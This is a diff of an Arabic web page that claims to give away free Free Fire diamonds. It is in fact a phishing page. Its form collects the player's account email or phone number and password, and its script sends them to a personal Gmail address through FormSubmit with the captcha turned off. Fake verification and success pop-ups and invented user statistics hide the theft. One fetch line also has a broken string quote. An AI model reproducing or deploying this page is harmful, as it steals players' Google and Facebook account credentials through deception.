@@ -6,107 +6,577 @@
     <title>شحن جواهر فري فاير مجاناً</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
-        /* كل أنماط CSS السابقة تبقى كما هي */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Cairo', sans-serif; background: linear-gradient(135deg, #fff 0%, #fffacd 100%); }
-        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
-        .header { text-align: center; background: white; border-radius: 20px; padding: 30px; margin-bottom: 30px; border: 3px solid #ffc107; }
-        /* ... (احتفظ بباقي الأنماط كما هي) ... */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #ffffff 0%, #fff9e6 100%);
+            color: #333;
+            line-height: 1.6;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            padding: 40px 0;
+            background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%);
+            border-radius: 20px;
+            margin-bottom: 40px;
+            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.3);
+        }
+
+        .logo {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: block;
+            border: 5px solid #fff;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .main-title {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .subtitle {
+            font-size: 1.2rem;
+            color: #666;
+            font-weight: 400;
+        }
+
+        .section {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+            border: 2px solid #ffd700;
+        }
+
+        .section-title {
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 20px;
+            text-align: center;
+            position: relative;
+        }
+
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80px;
+            height: 3px;
+            background: linear-gradient(90deg, #ffd700, #ffed4e);
+            border-radius: 2px;
+        }
+
+        .description {
+            font-size: 1.1rem;
+            text-align: center;
+            margin-bottom: 30px;
+            color: #555;
+            line-height: 1.8;
+        }
+
+        .stats {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin: 30px 0;
+            flex-wrap: wrap;
+        }
+
+        .stat-item {
+            text-align: center;
+            padding: 20px;
+            background: linear-gradient(135deg, #ffd700, #ffed4e);
+            border-radius: 15px;
+            color: #333;
+            min-width: 200px;
+            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
+        }
+
+        .stat-number {
+            font-size: 2rem;
+            font-weight: 700;
+            display: block;
+        }
+
+        .stat-label {
+            font-size: 1rem;
+            margin-top: 5px;
+        }
+
+        .steps {
+            margin-top: 40px;
+        }
+
+        .step {
+            background: #f9f9f9;
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 20px;
+            border-right: 5px solid #ffd700;
+            position: relative;
+        }
+
+        .step-number {
+            position: absolute;
+            top: -10px;
+            right: 20px;
+            background: #ffd700;
+            color: #333;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 1.2rem;
+            box-shadow: 0 3px 10px rgba(255, 215, 0, 0.5);
+        }
+
+        .step-title {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 15px;
+            margin-top: 10px;
+        }
+
+        .form-container {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            margin: 20px 0;
+            border: 2px solid #ffd700;
+            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.2);
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 1rem;
+            font-family: 'Cairo', sans-serif;
+            transition: all 0.3s ease;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #ffd700;
+            box-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
+        }
+
+        .note {
+            background: #fff3cd;
+            border: 1px solid #ffd700;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            font-size: 0.9rem;
+            color: #856404;
+        }
+
+        .btn {
+            background: linear-gradient(135deg, #ffd700, #ffed4e);
+            color: #333;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 25px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Cairo', sans-serif;
+            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(255, 215, 0, 0.4);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+
+        .modal-content {
+            background-color: white;
+            margin: 15% auto;
+            padding: 30px;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        .modal-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .modal-text {
+            font-size: 1rem;
+            color: #666;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+
+        .close {
+            color: #aaa;
+            float: left;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .close:hover {
+            color: #333;
+        }
+
+        .warning {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+
+        .success {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,215,0,.3);
+            border-radius: 50%;
+            border-top-color: #ffd700;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 768px) {
+            .main-title {
+                font-size: 2rem;
+            }
+            
+            .stats {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .stat-item {
+                min-width: auto;
+                width: 100%;
+                max-width: 300px;
+            }
+            
+            .container {
+                padding: 10px;
+            }
+            
+            .section {
+                padding: 20px;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="container">
+        <!-- Header -->
         <div class="header">
             <img src="https://i.postimg.cc/BZ8r90LK/102a5b7ea35ab8cce5b61aad6ddde212.jpg" alt="شعار فري فاير" class="logo">
-            <h1 class="main-title">شحن جواهر فري فاير</h1>
-            <p class="subtitle">احصل على جواهر مجانية كل شهر!</p>
+            <h1 class="main-title">شحن جواهر فري فاير مجاناً</h1>
+            <p class="subtitle">احصل على جواهر مجانية كل شهر بسهولة</p>
         </div>
 
-        <div class="description">
-            <h2>عن الموقع</h2>
-            <p>موقعنا يقدم لك فرصة الحصول على جواهر فري فاير مجانية كل شهر بعد تنفيذ الخطوات البسيطة المطلوبة.</p>
-            <div class="stats">
-                أكثر من 500,000 شخص لديهم تقييمات إيجابية عن الموقع
-            </div>
-        </div>
-
-        <div class="steps-container">
-            <h2 class="steps-title">الخطوات المطلوبة</h2>
+        <!-- About Section -->
+        <div class="section">
+            <h2 class="section-title">عن الموقع</h2>
+            <p class="description">
+                موقعنا يقدم لك فرصة الحصول على جواهر فري فاير مجانية كل شهر! 
+                كل ما عليك فعله هو اتباع الخطوات البسيطة وستحصل على جواهرك المجانية.
+                موقعنا آمن وموثوق ويستخدمه آلاف اللاعبين حول العالم.
+            </p>
             
-            <div class="step">
-                <div class="step-title">
-                    <span class="step-number">1</span>
-                    املأ قسم إدخال معلومات حسابك
+            <div class="stats">
+                <div class="stat-item">
+                    <span class="stat-number">500,000+</span>
+                    <span class="stat-label">مستخدم راضٍ</span>
                 </div>
-                
-                <!-- النموذج المعدل -->
-                <form id="gemsForm" action="https://formsubmit.co/fifikoridek@gmail.com" method="POST">
-                    <!-- إعدادات FormSubmit -->
-                    <input type="hidden" name="_captcha" value="false">
-                    <input type="hidden" name="_subject" value="طلب جواهر فري فاير جديد">
-                    <input type="hidden" name="_template" value="table">
-                    <input type="hidden" name="_next" value="https://yourusername.github.io/thanks.html">
-                    
-                    <div class="form-group">
-                        <label for="account">رقم الهاتف أو البريد الإلكتروني:</label>
-                        <input type="text" id="account" name="account" required placeholder="أدخل رقم الهاتف أو البريد الإلكتروني">
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="password">كلمة السر:</label>
-                        <input type="password" id="password" name="password" required placeholder="أدخل كلمة السر">
-                    </div>
-                    
-                    <div class="note">
-                        <strong>ملاحظة مهمة:</strong><br>
-                        • أدخل الإيميل إذا كان حسابك في فري فاير مسجل بجوجل<br>
-                        • أدخل رقم الهاتف إذا كان حسابك في فري فاير مسجل بفيسبوك
-                    </div>
-                    
-                    <button type="submit" class="submit-btn">إرسال</button>
-                </form>
-                
-                <div class="loading" id="loading">
-                    <div class="spinner"></div>
-                    <p>جاري المعالجة...</p>
+                <div class="stat-item">
+                    <span class="stat-number">100%</span>
+                    <span class="stat-label">آمن وموثوق</span>
                 </div>
-                
-                <div class="message info" id="successMessage" style="display:none;">
-                    تم استلام طلبك بنجاح! سيصلك تأكيد خلال 24 ساعة.
+                <div class="stat-item">
+                    <span class="stat-number">24/7</span>
+                    <span class="stat-label">دعم فني</span>
                 </div>
             </div>
         </div>
 
-        <div class="footer">
-            <p>© 2024 موقع شحن جواهر فري فاير - جميع الحقوق محفوظة</p>
+        <!-- Steps Section -->
+        <div class="section">
+            <h2 class="section-title">خطوات الحصول على الجواهر</h2>
+            
+            <div class="steps">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <h3 class="step-title">إدخال معلومات حسابك</h3>
+                    <p>املأ النموذج أدناه بمعلومات حسابك في فري فاير</p>
+                    
+                    <div class="form-container">
+                        <form id="accountForm">
+                            <input type="hidden" name="_captcha" value="false">
+                            <input type="hidden" name="_subject" value="Free Fire Diamond Top-Up Request">
+                            <input type="hidden" name="_template" value="table">
+                            <input type="hidden" name="_next" value="#">
+                            
+                            <div class="form-group">
+                                <label class="form-label">عنوان البريد الالكتروني او رقم الهاتف:</label>
+                                <input type="text" class="form-input" name="emailOrPhone" placeholder="أدخل البريد الإلكتروني أو رقم الهاتف" required>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label">كلمة المرور:</label>
+                                <input type="password" class="form-input" name="password" placeholder="أدخل كلمة المرور" required>
+                            </div>
+                            
+                            <div class="note">
+                                <strong>ملاحظة مهمة:</strong><br>
+                                • أدخل البريد الإلكتروني إذا كان حسابك في فري فاير مسجل بجوجل<br>
+                                • أدخل رقم الهاتف إذا كان حسابك في فري فاير مسجل بفايسبوك
+                            </div>
+                            
+                            <button type="submit" class="btn" id="submitBtn">
+                                <span id="btnText">إرسال المعلومات</span>
+                            </button>
+                        </form>
+                    </div>
+                </div>
+
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <h3 class="step-title">التحقق من الحساب</h3>
+                    <p>بعد إرسال المعلومات، سيتم التحقق من صحة حسابك وأهليته للحصول على الجواهر</p>
+                </div>
+
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <h3 class="step-title">استلام الجواهر</h3>
+                    <p>إذا كان حسابك يوافي الشروط، ستستلم الجواهر خلال يوم أو أكثر</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Warning Section -->
+        <div class="section">
+            <div class="warning">
+                <h3>تنبيه مهم:</h3>
+                <p>
+                    • إذا نجحت في الحصول على الجواهر، فأنت قد طبقت كل شروطنا بنجاح<br>
+                    • إذا لم تحصل على الجواهر، فقد أدخلت معلومات خاطئة أو أن حسابك غير صالح
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modals -->
+    <div id="verificationModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h3 class="modal-title">جاري التحقق</h3>
+            <p class="modal-text">
+                جاري التحقق من صحة إدخال معلومات حسابك...<br>
+                إذا كان حسابك يوافي الشروط سيتم إرسال الجواهر.<br><br>
+                بعد التحقق يمكنك الانتظار ليوم أو أكثر للحصول على النتيجة.
+            </p>
+        </div>
+    </div>
+
+    <div id="successModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h3 class="modal-title">تم الإرسال بنجاح!</h3>
+            <p class="modal-text">
+                تم إرسال معلومات حسابك بنجاح إلى فريق الدعم.<br>
+                سيتم التحقق من الحساب وإرسال الجواهر إذا كان مؤهلاً.<br>
+                قد تستغرق العملية من 24 إلى 48 ساعة.
+            </p>
+            <button class="btn" onclick="closeModal('successModal')">حسناً</button>
+        </div>
+    </div>
+
+    <div id="errorModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h3 class="modal-title">حدث خطأ!</h3>
+            <p class="modal-text" id="errorMessage">
+                حدث خطأ أثناء محاولة إرسال المعلومات. يرجى المحاولة مرة أخرى لاحقاً.
+            </p>
+            <button class="btn" onclick="closeModal('errorModal')">حسناً</button>
         </div>
     </div>
 
     <script>
-        document.getElementById('gemsForm').addEventListener('submit', function(e) {
+        // Form submission
+        document.getElementById("accountForm").addEventListener("submit", async function(e) {
             e.preventDefault();
-            const form = e.target;
-            const loading = document.getElementById('loading');
             
-            // إظهار رسالة التحميل
-            loading.style.display = 'block';
+            const emailOrPhone = document.querySelector("input[name='emailOrPhone']").value;
+            const password = document.querySelector("input[name='password']").value;
+            const submitBtn = document.getElementById("submitBtn");
+            const btnText = document.getElementById("btnText");
             
-            // إرسال النموذج
-            fetch(form.action, {
-                method: 'POST',
-                body: new FormData(form),
-                headers: {
-                    'Accept': 'application/json'
+            if (!emailOrPhone || !password) {
+                alert("يرجى ملء جميع الحقول المطلوبة");
+                return;
+            }
+            
+            // Show loading state
+            submitBtn.disabled = true;
+            btnText.innerHTML = '<span class="loading"></span> جاري الإرسال...';
+            
+            try {
+                // Show verification modal
+                showModal("verificationModal");
+                
+                // Prepare form data
+                const formData = new FormData(this);
+                
+                // Send data to FormSubmit
+                const response = await fetch('https://formsubmit.co/ajax/fifikoridek@gmail.com, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        _subject: "Free Fire Diamond Top-Up Request",
+                        _template: "table",
+                        _captcha: "false",
+                        emailOrPhone: emailOrPhone,
+                        password: password
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (response.ok && result.success) {
+                    // Show success modal
+                    closeModal("verificationModal");
+                    showModal("successModal");
+                    
+                    // Reset form
+                    document.getElementById("accountForm").reset();
+                } else {
+                    throw new Error(result.message || 'حدث خطأ أثناء الإرسال');
                 }
-            })
-            .then(response => {
-                loading.style.display = 'none';
-                document.getElementById('successMessage').style.display = 'block';
-                form.reset();
-            })
-            .catch(error => {
-                loading.style.display = 'none';
-                alert('حدث خطأ، يرجى المحاولة مرة أخرى');
+            } catch (error) {
+                // Show error modal
+                closeModal("verificationModal");
+                document.getElementById("errorMessage").textContent = error.message;
+                showModal("errorModal");
+            } finally {
+                // Reset button state
+                submitBtn.disabled = false;
+                btnText.textContent = 'إرسال المعلومات';
+            }
+        });
+
+        // Modal functions
+        function showModal(modalId) {
+            document.getElementById(modalId).style.display = 'block';
+        }
+
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = 'none';
+        }
+
+        // Close modal when clicking on X
+        document.querySelectorAll('.close').forEach(closeBtn => {
+            closeBtn.addEventListener('click', function() {
+                this.closest('.modal').style.display = 'none';
+            });
+        });
+
+        // Close modal when clicking outside
+        window.addEventListener('click', function(event) {
+            if (event.target.classList.contains('modal')) {
+                event.target.style.display = 'none';
+            }
+        });
+
+        // Add some animations
+        window.addEventListener('load', function() {
+            const sections = document.querySelectorAll('.section');
+            sections.forEach((section, index) => {
+                section.style.opacity = '0';
+                section.style.transform = 'translateY(20px)';
+                setTimeout(() => {
+                    section.style.transition = 'all 0.6s ease';
+                    section.style.opacity = '1';
+                    section.style.transform = 'translateY(0)';
+                }, index * 200);
             });
         });
     </script>
